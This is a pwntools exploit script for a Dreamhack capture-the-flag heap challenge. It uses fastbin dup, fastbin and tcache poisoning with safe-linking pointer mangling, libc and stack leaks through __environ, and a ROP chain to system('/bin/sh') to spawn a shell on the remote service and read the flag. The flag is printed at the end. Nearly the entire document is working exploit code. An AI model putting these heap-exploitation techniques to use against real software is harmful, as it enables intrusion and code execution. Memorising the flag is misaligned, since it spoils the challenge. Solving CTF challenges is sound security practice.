#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def alloc(idx, data):
	global cnt
	sla(b"> ", b"1")
	sla(b"index : ", f"{idx}".encode())
	sa(b"data : ", data)
	cnt += 1

def print_m(idx):
	sla(b"> ", b"2")
	sla(b"index : ", f"{idx}".encode())

def free(idx):
	sla(b"> ", b"3")
	sla(b"index : ", f"{idx}".encode())


script = '''
# scanf choice
brva 0x16DF
'''

p = remote("host8.dreamhack.games", 13918)
#p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)

cnt = 0

# leak libc
alloc(0, b"0" * 8)
free(0)
print_m(0)
rcu(b"data : ")
heap_base = (u64(p.recv(5).ljust(8, b"\x00"))) << 12
lleak("heap_base", heap_base)

# fengshui
for i in range(1, 0x15):
	alloc(cnt, b"1" * 8)

# fastbin dup
for i in range(1, 8):
	free(i)
free(8)
free(9)
free(8)

# clear out tcache 
# also create fake fastbin chunk overlap with chunk[2]
for i in range(1, 7): # clear out tcache
	alloc(cnt, b"2" * 0x8)
mangle = (0 ^ ((heap_base + 0x2d0) >> 12))
alloc(cnt, b"2" * 0x38 + p64(0x51) + p64(mangle))

# fastbin poisoning
mangle = (heap_base + 0x2e0) ^ ((heap_base + 0x4c0) >> 12)
alloc(cnt, p64(mangle))

# create fake unsortebin (change chunk[2] size) 
for i in range(2):
	alloc(cnt, b"3" * 8)
alloc(cnt, b"3" * 8 + p64(0x5a1))

# leak libc
free(2)
print_m(2)
rcu(b"data : ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
lleak("libc_base", libc_base)

# tcache poisoning to environ (via overlapping chunk)
alloc(cnt, b"4" * 8)
free(15)
free(32)
free(31)
environ = libc_base + libc.symbols['__environ']
mangle = (environ - 0x10) ^ ((heap_base + 0x2f0) >> 12)
alloc(cnt, b"5" * 8 + p64(0x51) + p64(mangle))

# leak stack
alloc(cnt, b"6" * 0x10)
alloc(cnt, b"6" * 0x10)
print_m(cnt - 1)
rcu(b"6" * 0x10)
rbp_main = u64(p.recv(6).ljust(8, b"\x00")) - 0x128
lleak("rbp_main", rbp_main)

# rop
free(14)
free(32)
free(31)
mangle = (rbp_main) ^ ((heap_base + 0x2f0) >> 12)
alloc(cnt, b"7" * 8 + p64(0x51) + p64(mangle))
alloc(cnt, b"7" * 0x10)
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
#debug()
alloc(cnt, p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

# trigger
sla(b"> ", b"5")

sl(b"cat flag")

p.interactive()
#DH{7Lu17IyT6riw7Lu17IyT6riw7Lu17IyT6riw7Lu17IyT6riw}